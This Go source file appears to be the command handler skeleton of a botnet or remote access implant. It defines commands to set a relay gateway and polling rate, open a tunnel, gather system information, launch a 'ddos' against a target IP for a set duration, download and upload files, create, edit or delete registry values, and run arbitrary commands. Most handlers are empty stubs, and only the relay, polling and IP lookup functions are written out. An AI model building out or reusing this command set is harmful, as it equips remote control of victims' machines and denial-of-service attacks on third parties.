package main

import (
	"encoding/json"
	"io"
	"log"
	"net"
	"net/http"
	"regexp"
)

type SetRelayParams struct {
	Name string `json:"name"`
	Args struct {
		Ip string `json:"ip"`
	}
}

func setRelay(params SetRelayParams, CONFIG *Config) {
	IP_ADDRESS_REGEX := `\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}`

	doesMatch, err := regexp.MatchString(IP_ADDRESS_REGEX, params.Args.Ip)
	if err != nil {
		log.Fatal(err)
	}

	if doesMatch {
		CONFIG.Gateway = params.Args.Ip
	}

	log.Println("Now relay is ", CONFIG.Gateway)
}

type SetPullingRateParams struct {
	Name string `json:"name"`
	Args struct {
		Seconds int `json:"seconds"`
	} `json:"args"`
}

func setPullingRate(params SetPullingRateParams, CONFIG *Config) {
	CONFIG.PullingRate = params.Args.Seconds
	log.Println("Pulling rate is set to", CONFIG.PullingRate, "seconds")
}

type OpenTunnelParams struct {
}

func openTunnel(params OpenTunnelParams) {

}

type GetSysInfoParams struct {
}

func getSysInfo(params GetSysInfoParams) {

}

type PingParams struct {
	TargetIp string `json:"targetIp"`
}

func ping(params PingParams) {

}

type DdosParams struct {
	TargetIp string `json:"targetIp"`
	Duration int    `json:"duration"`
}

func ddos(params DdosParams) {

}

type DownloadFileParams struct {
	Url  string `json:"url"`
	Path string `json:"path"`
}

func downloadFile(params DownloadFileParams) {

}

type UploadFileParams struct {
	Path string `json:"path"`
}

func uploadFile(params UploadFileParams) {

}

type GetPublicIpParams struct {
}

type IpData struct {
	Ip string `json:"ip"`
}

func getPublicIp(params GetPublicIpParams) {
	client := &http.Client{}
	data := IpData{}

	req, err := http.NewRequest("GET", "https://api.ipify.org?format=json", nil)
	if err != nil {
		log.Fatal(err)
	}
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()

	bytes, err := io.ReadAll(resp.Body)

	err = json.Unmarshal(bytes, &data)
	if err != nil {
		panic(err)
	}
	log.Println("Ip address :", data.Ip)
}

type GetPrivateIpParams struct {
	Network string `json:"network"`
}

func getPrivateIp(params GetPrivateIpParams) {

	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()

	localAddress := conn.LocalAddr().(*net.UDPAddr)

	log.Println(localAddress.IP)
}

type CreateRegValueParams struct {
	Path      string `json:"path"`
	TargetKey string `json:"targetKey"`
	Value     string `json:"value"`
}

func createRegValue(params CreateRegValueParams) {

}

type EditRegValueParams struct {
	Path      string `json:"path"`
	TargetKey string `json:"targetKey"`
	Value     string `json:"value"`
}

func editRegValue(params EditRegValueParams) {

}

type DeleteRegValueParams struct {
	Path      string `json:"path"`
	TargetKey string `json:"targetKey"`
}

func deleteRegValue(params DeleteRegValueParams) {

}

type RunCommandParams struct {
	Command string `json:"command"`
}

func runCommand(params RunCommandParams) {

}
